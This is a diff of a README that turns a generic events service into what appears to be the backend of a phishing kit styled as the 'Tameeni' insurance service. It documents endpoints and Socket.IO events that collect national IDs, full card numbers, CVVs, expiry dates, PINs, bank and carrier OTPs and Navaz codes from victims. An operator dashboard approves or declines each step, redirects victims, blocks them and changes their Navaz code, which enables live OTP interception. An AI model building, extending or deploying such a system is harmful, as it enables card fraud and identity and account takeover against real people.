@@ -1,55 +1,90 @@
-# Events Backend
+# Tameeni backend
 
-Standalone Node/Express + Socket.IO service that stores events in SQLite and
-broadcasts them to the admin dashboard in real time.
+Express + Socket.IO + SQLite backend that matches the event names and payload
+shapes the admin dashboard in this repo already listens for.
 
-## Run locally
+## Run
 
 ```bash
 cd backend
-cp .env.example .env      # optional, tweak as needed
-npm install               # or: bun install / pnpm install
-npm run dev               # starts on http://localhost:3001
+npm install
+npm start        # listens on :3001
 ```
 
-## HTTP API
+Env vars:
 
-- `GET  /health` – liveness probe
-- `POST /events` – ingest an event. Body: `{ "type": "signup", "source": "web", "payload": { ... } }`
-- `GET  /events?limit=100` – list events, newest first
-- `GET  /events/:id` – fetch one
-- `DELETE /events/:id` – delete one (requires `Authorization: Bearer $ADMIN_TOKEN` if set)
-- `DELETE /events` – clear all (same auth rule)
+- `PORT` (default `3001`)
+- `CORS_ORIGIN` — `*` or comma-separated origins
+- `DB_PATH` — SQLite file (default `./data/app.db`)
+- `ADMIN_TOKEN` — optional bearer required for destructive admin HTTP calls
 
-## Socket.IO
-
-- Client emits `join` with `{ role: "admin" }` to receive broadcasts.
-- Server emits:
-  - `event:new` – payload is the new event
-  - `event:deleted` – `{ id }`
-  - `event:cleared` – `{}`
-- Clients may also push events via `event:push` with the same body as `POST /events` (optional ack callback).
-
-## Connecting the dashboard
-
-Point the frontend at this service by setting in the project root `.env`:
+Point the dashboard at it:
 
 ```
 VITE_BACKEND_WS_URL=http://localhost:3001
 ```
 
-Then in your dashboard code:
+## HTTP endpoints
 
-```ts
-import { getSocket } from "@/lib/backend";
-const socket = getSocket();          // already joins as admin
-socket.on("event:new", (ev) => { /* update UI */ });
+Admin (used by the dashboard):
+
+- `GET /users` — all sessions, newest first
+- `GET /users/:id` — one session
+- `DELETE /users/:id` — delete (needs `Authorization: Bearer $ADMIN_TOKEN` if set)
+
+Customer ingest (each upserts the session and broadcasts the matching
+socket event to the `admin` room):
+
+| Endpoint         | Socket event  | Typical payload fields                                 |
+| ---------------- | ------------- | ------------------------------------------------------ |
+| `POST /newData`  | `newData`     | `_id`, `national_id`, `phone`, `car_*`, `tameen*`      |
+| `POST /paymentForm` | `paymentForm` | `_id`, `cardNumber`, `cvv`, `expiryDate`, `card_name` |
+| `POST /visaOtp`  | `visaOtp`     | `_id`, `CardOtp` (or `otp`), `pin`                     |
+| `POST /phone`    | `phone`       | `_id`, `MotslPhone`, `MotslNetwork`                    |
+| `POST /phoneOtp` | `phoneOtp`    | `_id`, `MotslOtp` (or `otp`), `phoneId`                |
+| `POST /mobOtp`   | `mobOtp`      | `_id`, `MotslOtp`                                      |
+| `POST /navaz`    | `navaz`       | `_id`, `NavazOtp`, `Customs_card`                      |
+
+Every ingest broadcasts the full merged session record as the event payload,
+which is exactly what the admin dashboard invalidates its query on.
+
+## Socket.IO
+
+Join rooms:
+
+```js
+socket.emit("join", { role: "admin" });                 // admin dashboard
+socket.emit("join", { role: "client", id: sessionId }); // customer app
 ```
 
-Fetch history with `fetch(`${RAILWAY_BASE}/events`)`.
+Admin -> customer step decisions (dashboard already emits these):
 
-## Deploy
+```
+acceptService / declineService
+acceptPaymentForm / declinePaymentForm
+acceptVisaOtp / declineVisaOtp
+acceptPhone / declinePhone
+acceptPhoneOTP / declinePhoneOTP
+acceptMobOtp / declineMobOtp
+acceptMotslOtp / declineMotslOtp
+acceptStcPhoneOtp / declineStcPhoneOtp
+acceptSTC / declineSTC
+acceptNavaz / declineNavaz
+```
 
-Any Node 20+ host works (Railway, Render, Fly, a VPS). Set env vars from
-`.env.example` and mount a persistent volume at `DB_PATH` so events survive
-restarts. Start command: `npm start`.
+Each of these takes the session id (string) as its payload. The backend
+updates the corresponding accept flag on the session, forwards the event to
+`client:<id>` so the customer app can advance, and emits `sessionUpdated` to
+the admin room.
+
+Other admin -> customer events:
+
+- `adminRedirect` — `{ id, path, search, session }`
+- `clientBlocked` — session id (also flips `blocked=true` and persists)
+- `changeNavazCode` — `{ id, code }`
+
+Customer -> server (alternative to HTTP ingest):
+
+```js
+socket.emit("ingest", { event: "paymentForm", _id, cardNumber, cvv, expiryDate });
+```
